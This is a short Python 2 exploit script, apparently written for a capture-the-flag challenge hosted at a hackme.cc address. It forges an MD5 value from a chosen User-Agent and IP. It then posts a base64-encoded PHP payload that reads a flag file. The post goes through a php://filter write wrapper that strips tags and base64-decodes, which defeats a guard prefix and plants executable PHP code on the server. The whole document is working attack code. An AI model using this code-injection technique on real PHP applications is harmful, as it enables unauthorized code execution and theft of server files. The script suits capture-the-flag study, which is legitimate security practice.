import requests
import hashlib
import base64

url = "http://rilakkuma.hackme.cc/rilakkuma.php"
remote_addr = '140.112.29.205' # my server's ip or proxy's ip

user_agent = "10"

m = hashlib.md5()
m.update(user_agent)
m.update(remote_addr)
my_md5 = m.hexdigest()
print my_md5

my_code = '<?php $file = fopen("../../flag.php", "r"); while (!feof($file)) { $value = fgets($file); print "The value of this line is " . $value . "<br>";} fclose($file); ?>'
my_code = base64.b64encode(my_code)

payload = {
            'data'      :   "\n?>\n" + my_code,
            # using wrapper
            'filename'  :   "php://filter/write=string.strip_tags|convert.base64-decode/resource=a",
            }

headers = {
            'User-Agent'    :   user_agent,
        }
r = requests.post(url, data=payload, headers=headers)
print r.text
